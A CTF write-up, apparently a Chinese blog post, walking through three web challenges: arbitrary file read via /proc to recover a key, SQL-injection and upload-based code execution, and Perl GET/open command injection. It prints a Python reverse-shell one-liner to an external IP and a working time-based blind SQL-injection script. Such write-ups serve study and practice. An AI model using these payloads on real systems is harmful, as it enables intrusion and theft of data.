<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>考点:任意文件读取<br>一开始我还以为是ssrf，因为的确有点像<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667185467317-d1df4d28-f5a2-4536-86a6-c9d204b9aee2.png#averageHue=%23fbfbec&clientId=u14b8db21-aaf3-4&from=paste&height=81&id=ub4a24761&name=image.png&originHeight=101&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7586&status=done&style=none&taskId=u568d1758-860f-4a34-9611-33e75878bdf&title=&width=866.4" alt="image.png"><br>一个输入框，输入一个<a target="_blank" rel="noopener" href="http://www.baidu.com或者/etc/passwd%E9%83%BD%E4%BC%9A%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%EF%BC%8C%E7%94%A8010%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0%E6%98%AF%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A">http://www.baidu.com或者/etc/passwd都会得到一个图片文件，用010打开发现是源代码：</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667185509457-3adef55d-83c9-4a40-85a0-64e3d45f5584.png#averageHue=%232e2c23&clientId=u14b8db21-aaf3-4&from=paste&height=302&id=u4e7cde3c&name=image.png&originHeight=377&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55752&status=done&style=none&taskId=u9b64471d-8e66-4d5a-b5d0-0c98dfcf415&title=&width=596.8" alt="image.png"><br>所以存在任意文件读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在linux中，proc是一个虚拟文件系统，也是一个控制中心，里面储存是当前内核运行状态的一系列特殊文件；该系统只存在内存当中，以文件系统的方式为访问系统内核数据的操作提供接口，可以通过更改其中的某些文件来改变内核运行状态。它也是内核提供给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。</span><br><span class="line">/proc/pid/cmdline 包含了用于开始进程的命令 ；</span><br><span class="line">/proc/pid/cwd 包含了当前进程工作目录的一个链接 ；</span><br><span class="line">/proc/pid/environ 包含了可用进程环境变量的列表 ；</span><br><span class="line">/proc/pid/exe 包含了正在进程中运行的程序链接；</span><br><span class="line">/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</span><br><span class="line">/proc/pid/mem 包含了进程在内存中的内容；</span><br><span class="line">/proc/pid/stat 包含了进程的状态信息；</span><br><span class="line">/proc/pid/statm 包含了进程的内存使用信息。</span><br></pre></td></tr></table></figure>
<p>先读取一下当前的进程<code>/proc/self/cmdline</code>,self就代表自己<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667185594733-6213719e-f8b0-4620-a736-29d43ab8afa3.png#averageHue=%23f5f4f4&clientId=u14b8db21-aaf3-4&from=paste&height=228&id=u171ce8c4&name=image.png&originHeight=285&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34142&status=done&style=none&taskId=u097b89d6-9ca2-47dc-b75a-c067ebc63e6&title=&width=801.6" alt="image.png"><br>可以看到是一个app,py文件，是python的一个flask框架（猜测）<br>读取一下源代码<code>?url=app.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>代码不长，很好审计，可以看到有个secret_file，先打开了，然后又删除掉了，但是没有关闭文件流，也就是没有<code>close</code>，所以我们可以通过<code>/proc/self/pd</code>去查看进程打开的文件的信息，可以看到残留的信息：<br>经过测试是在<code>/proc/self/pd/3</code>里有信息：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667185743049-6c28241f-13a6-4e21-9549-a38487197028.png#averageHue=%23f6f5f5&clientId=u14b8db21-aaf3-4&from=paste&height=218&id=ue56cc8cf&name=image.png&originHeight=273&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36079&status=done&style=none&taskId=uca303fa2-1258-44dc-83ca-5430c0681d9&title=&width=956" alt="image.png"><br>得到了key，就去<code>/no_one_know_the_manager</code>去执行命令，但是要看到这里是没有回显的，所以要用反弹shell，经过测试发现nc和exec其他啥的都不可以，用python的<br><code>/no_one_know_the_manager?key=XvWSLF/yiD2nZP2av5Mjy02iDtgnOf88pGsDxAQtJzY=&amp;shell=python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;43.140.251.169&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667185800119-d7918de2-3610-402b-9b95-883b6e3f429a.png#averageHue=%23131110&clientId=u14b8db21-aaf3-4&from=paste&height=77&id=ub6031f10&name=image.png&originHeight=96&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5562&status=done&style=none&taskId=uc2fcfb8b-d465-46bc-9430-a6db08987ad&title=&width=411.2" alt="image.png"><br>成功得到flag，总而言之这道题感觉还是不错的，学到了有关proc的一些知识</p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>考点：SQL注入，文件上传，源码泄露<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273322426-db9ff117-f927-46c9-bfb3-64d1c6c7365b.png#averageHue=%23677792&clientId=u71d62b10-061d-4&from=paste&height=845&id=uc67a1b20&name=image.png&originHeight=1056&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=732975&status=done&style=none&taskId=ucd089a47-b67e-4d7e-bfff-d91212dd6fc&title=&width=1536" alt="image.png"><br>一个登录界面，访问robots.txt，发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273333379-11951e57-686c-4ab7-9444-ba5664e47a0c.png#averageHue=%23f0e6c3&clientId=u71d62b10-061d-4&from=paste&height=170&id=u2191c85c&name=image.png&originHeight=213&originWidth=384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11285&status=done&style=none&taskId=u3a40c1ad-a978-42a7-ad7e-ef05e663c1f&title=&width=307.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273361286-1ad520aa-499f-41a1-9a4e-297bd0fa919a.png#averageHue=%23fcfaf8&clientId=u71d62b10-061d-4&from=paste&height=32&id=ua4f36efc&name=image.png&originHeight=40&originWidth=522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2380&status=done&style=none&taskId=u32b67c9f-6f44-4642-a58a-460991ac6a7&title=&width=417.6" alt="image.png"><br>说明有源码泄露，测试一遍发现，只泄露了image.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);	</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
<p>审计后发现这里存在SQL注入，假如id输入<code>\\0</code>，经过addslashes函数处理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273404996-ae887a4d-3fd3-46ae-938a-1eb2b54de41d.png#averageHue=%23f2f2f1&clientId=u71d62b10-061d-4&from=paste&height=145&id=u94b3e91c&name=image.png&originHeight=181&originWidth=1330&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20298&status=done&style=none&taskId=u023cf1f7-ccb8-418d-b8a4-b321c3c3628&title=&width=1064" alt="image.png"><br>变成<code>\\\\0</code>，再经过替换就变成了<code>\\\</code>，这里别搞混了，这里最后变成了<code>\\</code>，第一个没有转义效果，第二个有：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667393226548-c526deda-6329-46a9-a9ef-b2829363f7d8.png#averageHue=%23171614&clientId=uf17f2d4c-a161-4&from=paste&height=217&id=u6c6b1eba&name=image.png&originHeight=271&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31132&status=done&style=none&taskId=uf3feb0c7-ebe3-44b0-a40f-46721526da4&title=&width=827.2" alt="image.png"><br>，其实我们也可以直接用<code>\0</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667393247613-4296117f-0564-4138-baba-ad902b9c5618.png#averageHue=%23fafbd8&clientId=uf17f2d4c-a161-4&from=paste&height=90&id=ud4888af5&name=image.png&originHeight=113&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9082&status=done&style=none&taskId=ud0e7f97e-1ee6-4ef1-9031-0452ba901f9&title=&width=420" alt="image.png"><br>直接就变成了单引号，我铸币了！<br>这里经过测试没有回显，用盲注：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AUthor:@Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://fcf7e1fe-3937-4402-9be7-06d89f43e0c5.node4.buuoj.cn:81/image.php&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">255</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="string">&quot;\\\\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">f&quot;or if(ascii(substr((select group_concat(password) from users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.4),2)-- -&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data[&#x27;path&#x27;])</span></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r=requests.get(url,params=data)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1.3</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.3),2)-- -</span></span><br><span class="line"><span class="comment">#images,users</span></span><br><span class="line"><span class="comment">#or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.3),2)-- -</span></span><br><span class="line"><span class="comment">#username,password</span></span><br><span class="line"><span class="comment">#admind0ccc9ed4289081ca5</span></span><br></pre></td></tr></table></figure>
<p>得到了用户名密码，就登陆：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273511254-196777a5-a80a-47d0-ace5-1c04969822d2.png#averageHue=%23fdfcfc&clientId=u71d62b10-061d-4&from=paste&height=222&id=uc9d430c1&name=image.png&originHeight=277&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15614&status=done&style=none&taskId=u608ea4fb-4a24-4831-9ede-79eacfda30d&title=&width=997.6" alt="image.png"><br>有一个文件上传，不能上传php后缀名，上传.png发现：<br>    <img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273523308-3d64e736-ec76-403a-b7c7-5b8760bdf994.png#averageHue=%23f2f2f2&clientId=u71d62b10-061d-4&from=paste&height=88&id=uf8f6774f&name=image.png&originHeight=110&originWidth=563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7772&status=done&style=none&taskId=u91701a90-0cb2-4c40-977b-03dacda2fb8&title=&width=450.4" alt="image.png"><br>访问这个路径：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273533426-c219b5da-1d0f-4c29-be86-9e3d6bfece13.png#averageHue=%23cceebf&clientId=u71d62b10-061d-4&from=paste&height=80&id=u62252841&name=image.png&originHeight=100&originWidth=559&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3025&status=done&style=none&taskId=u91775859-4244-457d-973c-bb78c9dd95e&title=&width=447.2" alt="image.png"></p>
<p>这是一个php文件，输出了我们上传的日志，其实这里file后面跟了文件名的，只不过我做题的时候用了短标签，就显示不出来了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273576780-13b299a8-2668-4feb-8101-edae9b2c2d3c.png#averageHue=%23ebebeb&clientId=u71d62b10-061d-4&from=paste&height=177&id=u7757ae8c&name=image.png&originHeight=221&originWidth=479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11352&status=done&style=none&taskId=ud087793e-de7f-403e-8347-179ecdeabd8&title=&width=383.2" alt="image.png"><br>正常大概就这样，这里我们虽然不知道我们上传的文件保存路径，但是这边已经有个php文件，我们可以再文件名写入恶意代码，让php解析：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273607534-9bf42352-99b7-4cab-9c25-a451fa3e6e07.png#averageHue=%23f5f4f4&clientId=u71d62b10-061d-4&from=paste&height=102&id=u3728bf21&name=image.png&originHeight=127&originWidth=631&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12761&status=done&style=none&taskId=ud0379245-9839-4096-a1ef-f4aaea60e2f&title=&width=504.8" alt="image.png"><br>名字里不能有PHP，被ban了，所以用短标签，之后就RCE：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273630185-a500c2cd-3f71-4ad1-8800-127e59fa5c74.png#averageHue=%231c1c1c&clientId=u71d62b10-061d-4&from=paste&height=174&id=u75ff71cd&name=image.png&originHeight=217&originWidth=1325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28072&status=done&style=none&taskId=u3178b11d-4c5f-48eb-965b-38d03831a03&title=&width=1060" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667273639104-e311e27b-665e-4295-8905-6d44f372c9e9.png#averageHue=%23eeeeee&clientId=u71d62b10-061d-4&from=paste&height=37&id=u6dd790a2&name=image.png&originHeight=46&originWidth=637&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2336&status=done&style=none&taskId=u11b92118-fa61-4062-9099-609e1e1c7f3&title=&width=509.6" alt="image.png"><br>马马虎虎</p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>考点 : perl脚本GET open命令漏洞,说实话和SSRF有个鸟关系<br>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求,GET函数底层就是调用了open处理<br>open存在命令执行，并且还支持file函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));	</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>审计一番发现没什么，escapeshellarg应该都知道咋用的，目的就是不让你能执行多条shell命令</p>
<ul>
<li><p>先在sandbox文件夹内创建了一个<code>md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]</code>文件夹，这个名称我们可以手动计算出来的</p>
</li>
<li><p>然后运行GET命令：</p>
</li>
<li><p>之后再用pathinfo对filename进行操作</p>
</li>
</ul>
<p><strong>file 协议利用 open 命令执行</strong><br>perl的feature，在open下可以执行命令，前提是文件事先存在：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@izwz962asjj9zbi0ahwa55z test]<span class="comment"># perl a.pl</span></span><br><span class="line">[root@izwz962asjj9zbi0ahwa55z test]<span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line">cat a.pl</span><br><span class="line"><span class="keyword">open</span>(FD, <span class="string">&quot;|id&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br></pre></td></tr></table></figure>
<p>下面我们来看看使用GET如何来执行系统命令。（具体啥原因就不讲了，俺也不知道，大概就是open函数支持file协议吧 ） 要执行的命令先前必须要有以命令为文件名的文件存在<br>我们执行以下命令:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="string">&#x27;ls|&#x27;</span></span><br><span class="line">GET <span class="string">&quot;file:ls|&quot;</span></span><br></pre></td></tr></table></figure>
<p>但是为什么没有按照预期执行呢？ 我们去看看file.pm模块。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/perl5/LWP/Protocol</span><br><span class="line">cat file.pm</span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read the file</span></span><br><span class="line">    <span class="keyword">if</span> ($method <span class="keyword">ne</span> <span class="string">&quot;HEAD&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">open</span>(<span class="keyword">my</span> $fh,<span class="string">&#x27;&lt;&#x27;</span>, $path) <span class="keyword">or</span> <span class="keyword">return</span> new   <span class="comment">##就是这里出了问题</span></span><br><span class="line">	    HTTP::Response(HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">			   <span class="string">&quot;Cannot read file &#x27;$path&#x27;: $!&quot;</span>);</span><br><span class="line">	<span class="keyword">binmode</span>($fh);</span><br><span class="line">	$response =  $self-&gt;collect($arg, $response, <span class="function"><span class="keyword">sub</span> </span>&#123;</span><br><span 